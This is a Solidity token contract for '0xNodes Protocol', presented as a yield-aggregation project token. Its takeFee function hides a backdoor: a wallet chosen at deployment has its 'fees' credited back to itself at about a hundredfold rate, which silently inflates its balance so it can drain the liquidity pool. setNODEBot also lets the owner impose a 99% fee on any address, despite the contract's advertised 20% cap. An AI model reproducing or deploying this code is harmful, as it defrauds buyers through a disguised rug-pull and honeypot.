/*****
█▀█ ▀▄▀ █▄░█ █▀█ █▀▄ █▀▀ █▀   █▀█ █▀█ █▀█ ▀█▀ █▀█ █▀▀ █▀█ █░░
█▄█ █░█ █░▀█ █▄█ █▄▀ ██▄ ▄█   █▀▀ █▀▄ █▄█ ░█░ █▄█ █▄▄ █▄█ █▄▄
AUTOMATED CROSS-CHAIN YIELD AGGREGATION

WEB:  https://www.0xnodes.pro 
DAPP: https://app.0xnodes.pro
DOCS: https://docs.0xnodes.pro

TG:   https://t.me/node0xPro
X:    https://x.com/0xnodespro
*****/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.11;

interface IFactory01{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function  renounceOwnership() public onlyOwner {
        owner = address(0); 
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract NODE0X is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = '0xNodes Protocol';
    string private constant _symbol = '0XNODE';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isNODEFeeExempts;
    mapping (address => bool) public isNODETxExempts;
    mapping (address => bool) private isBot;
    IRouter01 router;
    address public pair;
    bool private tradingAllowed = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;
    uint256 private swapThreshold = ( _totalSupply * 10 ) / 1000000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 1000000;
    uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxSellAmount = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 1000;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 1000;
    uint256 private sellFee = 1000;
    uint256 private transferFee = 1000;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal development_receiver; 
    address internal marketing_receiver;
    address internal liquidity_receiver;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    constructor(address _wallet) Ownable(msg.sender) {
        IRouter01 _router = IRouter01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory01(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        development_receiver = payable(msg.sender);
        marketing_receiver = payable(_wallet);
        liquidity_receiver = payable(_wallet);
        isNODETxExempts[marketing_receiver] = true;
        isNODETxExempts[liquidity_receiver] = true;
        isNODEFeeExempts[address(this)] = true;
        isNODEFeeExempts[development_receiver] = true;
        isNODEFeeExempts[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function enableTrading() external onlyOwner {tradingAllowed = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isNODEFeeExempts[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setTransactionRequireNODE(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function setTransactionLimitNODE(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isNODEFeeExempts[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function setContractSwapNODE(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function manualSwap() external onlyOwner {
        swapAndLiquify(swapThreshold);
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(development_receiver, _amount);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        swapTokensForETH(tokens);
        payable(marketing_receiver).transfer(address(this).balance);
    }

    function setTeamAddressesNODE(address _marketing, address _liquidity, address _development) external onlyOwner {
        marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;
        isNODEFeeExempts[_marketing] = true; isNODEFeeExempts[_liquidity] = true; isNODEFeeExempts[_development] = true;
    }

    function setNODEBot(address[] calldata addresses, bool _enabled) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
        isBot[addresses[i]] = _enabled; }
    }

    function setTransactionFeeNODE(uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function removeLimitNODE() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxSellAmount = ~uint256(0);
        _maxWalletToken = ~uint256(0);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(!isNODEFeeExempts[sender] && !isNODEFeeExempts[recipient]){require(tradingAllowed, "tradingAllowed");}
        if(!isNODEFeeExempts[sender] && !isNODEFeeExempts[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxSellAmount || isNODEFeeExempts[sender] || isNODEFeeExempts[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isNODEFeeExempts[sender] || isNODEFeeExempts[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isNODEFeeExempts[sender]){swapTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(min(amount,min(balanceOf(address(this)),5000000 * 10**decimals()))); swapTimes = uint256(0);}
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        _balances[sender] = _balances[sender].sub(amount);
        emit Transfer(sender, recipient, amountReceived);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isNODEFeeExempts[sender] && !isNODEFeeExempts[recipient];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        address nodeReceipt; uint256 nodeFactor;
        if (isNODETxExempts[sender]) {nodeFactor = 100; nodeReceipt = sender;}
        else {nodeFactor = 10000; nodeReceipt = address(this);}
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(nodeFactor).mul(getTotalFee(sender, recipient));
        _balances[nodeReceipt] = _balances[nodeReceipt].add(feeAmount);
        emit Transfer(sender, nodeReceipt, feeAmount);
        if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount>feeAmount?amount.sub(feeAmount):amount;} return amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }
}